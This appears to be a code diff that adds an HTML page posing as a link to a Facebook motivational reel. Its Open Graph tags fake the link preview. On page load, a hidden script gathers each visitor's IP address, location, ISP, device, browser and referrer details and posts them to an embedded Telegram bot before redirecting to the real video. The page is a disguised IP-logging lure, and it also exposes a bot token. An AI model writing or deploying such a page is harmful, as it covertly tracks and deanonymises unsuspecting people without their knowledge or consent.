@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Watch This Video</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- Open Graph Meta Tags for link previews -->
+  <meta property="og:title" content="Motivational Hindi Reel – Must Watch!">
+  <meta property="og:description" content="Short, powerful, and inspiring – watch now.">
+  <meta property="og:image" content="https://scontent.xx.fbcdn.net/v/t39.30808-6/123456789_987654321_example.jpg"> 
+  <!-- Replace above with actual Facebook reel thumbnail URL if needed -->
+  <meta property="og:url" content="https://www.facebook.com/reel/740631195346293/?mibextid=6AJuK9">
+  <meta property="og:type" content="video.other">
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+    }
+  </style>
+</head>
+<body>
+  <h2>Redirecting to video...</h2>
+  <p>Please wait while we load it for you.</p>
+
+  <script>
+    async function collectAndRedirect() {
+      const redirectURL = "https://www.facebook.com/reel/740631195346293/?mibextid=6AJuK9";
+
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const ipData = await res.json();
+
+        const details = {
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name,
+          org: ipData.org,
+          timezone: ipData.timezone,
+          timeOffset: new Date().getTimezoneOffset(),
+          lang: navigator.language,
+          ua: navigator.userAgent,
+          platform: navigator.platform,
+          screen: `${screen.width}x${screen.height}`,
+          color: screen.colorDepth,
+          ram: navigator.deviceMemory || "N/A",
+          cpu: navigator.hardwareConcurrency || "N/A",
+          online: navigator.onLine,
+          dnt: navigator.doNotTrack,
+          touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+          conn: navigator.connection?.effectiveType || "N/A",
+          ref: document.referrer
+        };
+
+        const msg = `
+📥 *New Visitor*
+🌐 *IP:* ${details.ip}
+📍 *Location:* ${details.city}, ${details.region}, ${details.country}
+🛰 *ISP:* ${details.org}
+🕒 *Timezone:* ${details.timezone} (Offset: ${details.timeOffset})
+🧠 *Language:* ${details.lang}
+📱 *Platform:* ${details.platform}
+🖥 *Screen:* ${details.screen}
+🌈 *Color Depth:* ${details.color}
+🧮 *RAM:* ${details.ram}
+🧠 *CPU Cores:* ${details.cpu}
+📡 *Network:* ${details.conn}
+🔍 *Referrer:* ${details.ref}
+🕶 *User-Agent:* ${details.ua}
+`;
+
+        await fetch("https://api.telegram.org/bot7330139447:AAH5btbZ4pKGYORK_GdXPnOE0Bbp63eiuFA/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "1537302428",
+            text: msg,
+            parse_mode: "Markdown"
+          })
+        });
+
+      } catch (err) {
+        console.warn("Visitor logging failed:", err);
+      } finally {
+        setTimeout(() => window.location.href = redirectURL, 800);
+      }
+    }
+
+    window.onload = collectAndRedirect;
+  </script>
+</body>
+</html>
